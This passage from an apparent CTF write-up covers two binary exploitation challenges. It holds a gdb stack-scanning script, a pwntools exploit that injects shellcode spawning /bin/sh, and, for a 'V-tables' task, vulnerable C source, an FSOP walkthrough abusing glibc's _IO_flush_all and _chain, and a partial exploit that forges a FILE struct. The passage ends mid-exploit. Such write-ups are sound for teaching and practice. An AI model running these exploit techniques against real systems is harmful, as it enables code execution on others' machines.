+[+] found 0x7f91e8a07a10 at offset 0x60 which leads to 0x7f91e8a11d8e with differnce  0xa37e
+[+] found 0x55e446c753e0 at offset 0x80 which leads to 0x55e446c7d964 with differnce  0x8584
+[+] found 0x55e446c753e0 at offset 0x80 which leads to 0x55e446c82415 with differnce  0xd035
+[+] found 0x55e446c753e0 at offset 0xc0 which leads to 0x55e446c7d964 with differnce  0x8584
+[+] found 0x55e446c753e0 at offset 0xc0 which leads to 0x55e446c82415 with differnce  0xd035
+[+] found 0x55e446c753e0 at offset 0x228 which leads to 0x55e446c7d964 with differnce  0x8584
+[+] found 0x55e446c753e0 at offset 0x228 which leads to 0x55e446c82415 with differnce  0xd035
+[+] found 0x55e446c753e0 at offset 0x268 which leads to 0x55e446c7d964 with differnce  0x8584
+[+] found 0x55e446c753e0 at offset 0x268 which leads to 0x55e446c82415 with differnce  0xd035
+[+] found 0x55e446c753e0 at offset 0x2b0 which leads to 0x55e446c7d964 with differnce  0x8584
+[+] found 0x55e446c753e0 at offset 0x2b0 which leads to 0x55e446c82415 with differnce  0xd035
+[+] found 0x55e446c75780 at offset 0x340 which leads to 0x55e446c7d964 with differnce  0x81e4
+[+] found 0x55e446c75780 at offset 0x340 which leads to 0x55e446c82415 with differnce  0xcc95
+[+] found 0x55e446c753e0 at offset 0x348 which leads to 0x55e446c7d964 with differnce  0x8584
+[+] found 0x55e446c753e0 at offset 0x348 which leads to 0x55e446c82415 with differnce  0xd035
+[+] found 0x7f91e9512ae8 at offset 0x478 which leads to 0x7f91e951d835 with differnce  0xad4d
+[+] found 0x7f91e8a07a10 at offset 0x498 which leads to 0x7f91e8a11d8e with differnce  0xa37e
+[+] found 0x7f91e9512ae8 at offset 0x510 which leads to 0x7f91e951d835 with differnce  0xad4d
+
+----------------------------------------------------------------
+[+] found 0x7f94a74d3a10 at offset 0x60 which leads to 0x7f94a74ddd8e with differnce  0xa37e
+[+] found 0x55d282e023e0 at offset 0x80 which leads to 0x55d282e0f415 with differnce  0xd035
+[+] found 0x55d282e023e0 at offset 0xc0 which leads to 0x55d282e0f415 with differnce  0xd035
+[+] found 0x55d282e023e0 at offset 0x228 which leads to 0x55d282e0f415 with differnce  0xd035
+[+] found 0x55d282e023e0 at offset 0x268 which leads to 0x55d282e0f415 with differnce  0xd035
+[+] found 0x55d282e023e0 at offset 0x2b0 which leads to 0x55d282e0f415 with differnce  0xd035
+[+] found 0x55d282e02780 at offset 0x340 which leads to 0x55d282e0f415 with differnce  0xcc95
+[+] found 0x55d282e023e0 at offset 0x348 which leads to 0x55d282e0f415 with differnce  0xd035
+[+] found 0x7f94a7fdbae8 at offset 0x478 which leads to 0x7f94a7fdd825 with differnce  0x1d3d
+[+] found 0x7f94a74d3a10 at offset 0x498 which leads to 0x7f94a74ddd8e with differnce  0xa37e
+[+] found 0x7f94a7fdbae8 at offset 0x510 which leads to 0x7f94a7fdd825 with differnce  0x1d3d
+[+] found 0x7f94a7fda018 at offset 0x5c8 which leads to 0x7f94a7fdd825 with differnce  0x380d
+[+] found 0x7f94a7fda018 at offset 0x5d0 which leads to 0x7f94a7fdd825 with differnce  0x380d
+[+] found 0x7f94a770fcd0 at offset 0x688 which leads to 0x7f94a77141e7 with differnce  0x4517
+[+] found 0x7f94a770fcd0 at offset 0x688 which leads to 0x7f94a7714517 with differnce  0x4847
+[+] found 0x7f94a770fcd0 at offset 0x688 which leads to 0x7f94a77154a7 with differnce  0x57d7
+[+] found 0x7f94a770fcd0 at offset 0x688 which leads to 0x7f94a77168fd with differnce  0x6c2d
+</code></pre></div></div>
+
+<p>the most recognizable and consitant one the <code class="language-plaintext highlighter-rouge">[+] found 0x55d282e023e0 at offset 0x228 which leads to 0x55d282e0f415 with differnce  0xd035</code> ,what this means is that at offset 0x228 in the stack , there is a pointer that points to &amp;sequence-0xd035</p>
+
+<p>we use this to get our <code class="language-plaintext highlighter-rouge">syscall</code> instruction , then we pivot the rsp to our code and push thye opcode</p>
+
+<h3 id="exploit-1">exploit</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## gdb script
+</span><span class="kn">import</span> <span class="nn">gdb</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="k">class</span> <span class="nc">CaptureRWSearch</span><span class="p">(</span><span class="n">gdb</span><span class="p">.</span><span class="n">Command</span><span class="p">):</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">(</span><span class="n">CaptureRWSearch</span><span class="p">,</span> <span class="bp">self</span><span class="p">).</span><span class="n">__init__</span><span class="p">(</span><span class="s">"capture_rw_search"</span><span class="p">,</span> <span class="n">gdb</span><span class="p">.</span><span class="n">COMMAND_USER</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">invoke</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">from_tty</span><span class="p">):</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s">"search-pattern </span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">to_string</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+        <span class="n">addrs</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">in_rw</span> <span class="o">=</span> <span class="bp">False</span>
+
+        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">output</span><span class="p">.</span><span class="n">splitlines</span><span class="p">():</span>
+            <span class="c1"># Detect new memory region header , to filter rw pages
+</span>            <span class="n">m_region</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">"\[(r[-w][^]]*)\]"</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">m_region</span><span class="p">:</span>
+                <span class="n">perms</span> <span class="o">=</span> <span class="n">m_region</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                <span class="n">in_rw</span> <span class="o">=</span> <span class="n">perms</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"rw"</span><span class="p">)</span>
+                <span class="k">continue</span>
+
+            <span class="k">if</span> <span class="n">in_rw</span><span class="p">:</span>
+                <span class="n">m_addr</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s">"\s*(0x[0-9a-fA-F]+):"</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">m_addr</span><span class="p">:</span>
+                    <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m_addr</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+                    <span class="n">addrs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">addrs</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">addrs</span><span class="p">:</span>
+                <span class="k">pass</span>
+                <span class="c1">#print(hex(a))
+</span>        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"No RW matches found."</span><span class="p">)</span>
+
+
+        <span class="n">rsp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="p">.</span><span class="n">parse_and_eval</span><span class="p">(</span><span class="s">"$rsp"</span><span class="p">))</span>
+        <span class="n">inferior</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">inferiors</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+
+        <span class="c1"># 1000 values, 8 bytes each
+</span>        <span class="n">rsp_vals</span><span class="o">=</span><span class="p">[]</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+            <span class="n">addr</span> <span class="o">=</span> <span class="n">rsp</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">inferior</span><span class="p">.</span><span class="n">read_memory</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+            <span class="n">value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>
+            <span class="n">rsp_vals</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">addr</span><span class="o">-</span><span class="n">rsp</span><span class="p">,</span><span class="n">value</span><span class="p">))</span>
+            <span class="c1">#print(f"{hex(addr)}: {hex(value)}")
+</span>
+        <span class="c1">#print(addrs)
+</span>        <span class="c1">#print(rsp_vals)
+</span>
+
+        <span class="c1">#### now we look for matches
+</span>        <span class="k">for</span> <span class="n">index</span><span class="p">,</span><span class="n">rsp</span> <span class="ow">in</span> <span class="n">rsp_vals</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">addrs</span><span class="p">:</span>
+                <span class="k">if</span> <span class="mi">0</span><span class="o">&lt;</span><span class="p">(</span><span class="n">addr</span><span class="o">-</span><span class="n">rsp</span><span class="p">)</span><span class="o">&lt;</span><span class="mh">0x10000</span><span class="p">:</span>
+                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] found </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">rsp</span><span class="p">)</span><span class="si">}</span><span class="s"> at offset </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="si">}</span><span class="s"> which leads to </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="si">}</span><span class="s"> with differnce  </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="o">-</span><span class="n">rsp</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">addrs</span>
+
+<span class="n">CaptureRWSearch</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##### exploit (this is the one made for the first part not the revenge)
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"python3 main.py"</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">))</span>
+<span class="c1">#p=remote("pwn-14caf623.p1.securinets.tn",9001)
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span>
+
+<span class="n">shellcode</span><span class="o">=</span><span class="s">""</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">'''
+        push rax
+        pop rdi
+        push r11
+        pop rsi
+        push rbx
+        pop rdx
+        '''</span>
+
+<span class="c1">#gdb.attach(p,"c")
+</span>
+<span class="c1">#shellcode+="pop rbx\n"*(0x448//8) # local
+</span><span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rbx</span><span class="se">\n</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x210</span><span class="o">//</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rdx</span><span class="se">\n</span><span class="s">"</span>  <span class="c1">## this goes in rdx for read later (nvm i wont use it xd , didnt remove it because i didnt wanna mess things up .)
+</span><span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rbx</span><span class="se">\n</span><span class="s">"</span>   <span class="c1">## 0x220 in total
+</span><span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rbx</span><span class="se">\n</span><span class="s">"</span>   <span class="c1">## 0x220 in total
+</span><span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rcx</span><span class="se">\n</span><span class="s">"</span>  <span class="c1"># this will go to rsp
+</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rbx</span><span class="se">\n</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0xd0</span><span class="o">//</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rdx</span><span class="se">\n</span><span class="s">"</span>  <span class="c1">## this goes in rdx for read later
+</span><span class="n">shellcode</span><span class="o">+=</span><span class="s">"push rcx</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rsp</span><span class="se">\n</span><span class="s">"</span>
+
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rbx</span><span class="se">\n</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0xd030</span><span class="o">//</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rcx</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="sa">f</span><span class="s">'''
+        push r11
+        pop rsp
+        pop rbx
+'''</span>
+
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rbx</span><span class="se">\n</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1a6e</span><span class="o">//</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="s">"pop rbx</span><span class="se">\n</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1a6e</span><span class="o">//</span><span class="mi">64</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rbx</span><span class="se">\n</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>
+<span class="c1">#shellcode+="pop r10\n"*1
+</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"push rcx</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="s">"pop rbx</span><span class="se">\n</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
+
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
+
+<span class="n">shell</span><span class="o">=</span><span class="s">'''
+    lea rdi,[rip+shell]
+    mov rsi,0
+    mov rdx,0
+    mov rax,0x3b
+    syscall
+    shell:
+    .string "/bin/sh"
+'''</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x1e3f</span><span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="n">shell</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="v-tables">V-tables</h1>
+
+<h3 id="source-code-">source code :</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="kt">void</span> <span class="nf">setup</span><span class="p">(){</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">vuln</span><span class="p">(){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"stdout : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">stdout</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">FILE</span><span class="p">));</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="n">setup</span><span class="p">();</span>
+    <span class="n">vuln</span><span class="p">();</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="tldr--1">tldr :</h3>
+
+<p>you can overwrite the stdout struct , but without overwriting the vtable xd</p>
+
+<h3 id="history-and-bts">history and BTS</h3>
+
+<p>the original task was like this</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">vuln</span><span class="p">(){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"stdout : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">stdout</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">FILE</span><span class="p">));</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>i tried triggering a _wide_data code path just from puts .
+For that i grabbed [KyleBot’s angry-FSROP] script , moodified it to find a path without for an unconstrained state starting from <code class="language-plaintext highlighter-rouge">_IO_new_file_xsputn</code> , with the same vtable and _mode (with mode modified we won’t even reach this function) . ==» no results .
+At this moment i decided to put a hardware breakpoint at &amp;vtable (awatch command in gdb) then view all functions that try to use the vtable maybe i could find other functions . thats when my eyes caught the <code class="language-plaintext highlighter-rouge">_IO_flush_all</code> function and saw the <code class="language-plaintext highlighter-rouge">_chain</code> usage and decided to make use of it . Sadly i couldn’t remove the <code class="language-plaintext highlighter-rouge">puts</code> so i had to remove it</p>
+
+<h3 id="solver">Solver</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
+<span class="nf">_IO_flush_all</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+
+<span class="cp">#ifdef _IO_MTSAFE_IO
+</span>  <span class="n">_IO_cleanup_region_start_noarg</span> <span class="p">(</span><span class="n">flush_cleanup</span><span class="p">);</span>
+  <span class="n">_IO_lock_lock</span> <span class="p">(</span><span class="n">list_all_lock</span><span class="p">);</span>
+<span class="cp">#endif
+</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span> <span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_chain</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">run_fp</span> <span class="o">=</span> <span class="n">fp</span><span class="p">;</span>
+      <span class="n">_IO_flockfile</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
+	   <span class="o">||</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
+	       <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
+				    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
+	   <span class="p">)</span>
+	  <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+	<span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
+
+      <span class="n">_IO_funlockfile</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+      <span class="n">run_fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="cp">#ifdef _IO_MTSAFE_IO
+</span>  <span class="n">_IO_lock_unlock</span> <span class="p">(</span><span class="n">list_all_lock</span><span class="p">);</span>
+  <span class="n">_IO_cleanup_region_end</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="cp">#endif
+</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>i explained above how i found this exact function . TLDR : this function is called in the <code class="language-plaintext highlighter-rouge">exit_handlers</code> to flush all <code class="language-plaintext highlighter-rouge">File</code> structs , one of them by default is <code class="language-plaintext highlighter-rouge">stdout</code> . this function flushes the current struct then flushes the struct pointed to by <code class="language-plaintext highlighter-rouge">_chain</code> of that same struct (single linked list logic)</li>
+  <li>the idea is to fake a <code class="language-plaintext highlighter-rouge">FILE</code> struct then make <code class="language-plaintext highlighter-rouge">stdout._chain</code> point to it</li>
+  <li>we dont have much space , so we have to overlap it with <code class="language-plaintext highlighter-rouge">stdout</code> , i chose to make it at <code class="language-plaintext highlighter-rouge">&amp;stdout-8</code> . Benefits of this is you control <code class="language-plaintext highlighter-rouge">vtable</code> and you only miss the <code class="language-plaintext highlighter-rouge">flags</code></li>
+  <li>Debugging phase i will skip , but when solving the task i was changing one element at a time until i survived the <code class="language-plaintext highlighter-rouge">clean up</code> of stdout</li>
+  <li>when we are inside the <code class="language-plaintext highlighter-rouge">clean up</code> of the fake struct , it becomes a typical fsop challenge where you use some <code class="language-plaintext highlighter-rouge">wide_data</code> chain to trigger code execution .</li>
+  <li>the only caveat is when executing our arbitrary function , the rdi points to stdout-8 which we dont control , so no typical <code class="language-plaintext highlighter-rouge">b"\x04\x04;sh"</code> inside of $rdi</li>
+  <li>from here there are multiple solutions , looking for <code class="language-plaintext highlighter-rouge">setcontext pivot</code> or using this gadget <code class="language-plaintext highlighter-rouge">add rdi , 0x10 , jmp rcx</code> . I was lazy to look for gadgets so i just called gets and made another <code class="language-plaintext highlighter-rouge">_chain</code> with a fully controlled file struct xd</li>
+  <li><strong>GGs</strong></li>
+</ul>
+
+<h3 id="exploit-2">exploit</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="c1">## _IO_new_file_overflow
+</span><span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        b* puts
+                        b* __GI__IO_flush_all+299
+                        c
+                        p _IO_2_1_stdout_
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc localhost 1337"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="c1">############### main exploit    ###############
+</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"stdout : "</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+<span class="c1">#debug()
+</span>
+
+<span class="n">f</span><span class="o">=</span><span class="n">FileStructure</span><span class="p">(</span><span class="n">null</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x00000000001e7000</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">stdout</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span>
+<span class="n">l</span><span class="o">=</span><span class="mh">0xe0</span>
+<span class="n">f</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="mh">0x1122334455667788</span> <span class="c1">#libc.symbols["_IO_wfile_jumps"]+0x18-0x38
+</span>
+<span class="c1">#f._wide_data=stdout+0xe0-0xe0
+</span>
+
+<span class="n">stdout</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span>
+<span class="n">l</span><span class="o">=</span><span class="mh">0xe0</span>
+
+<span class="n">f</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_wfile_jumps"</span><span class="p">]</span><span class="o">+</span><span class="mh">0x18</span><span class="o">-</span><span class="mh">0x18</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_wide_data</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0xe0</span><span class="o">-</span><span class="mh">0xe0</span>   <span class="o">-</span><span class="mh">0x28</span><span class="o">-</span><span class="mh">0x20</span><span class="o">-</span><span class="mh">0x18</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mi">8</span>
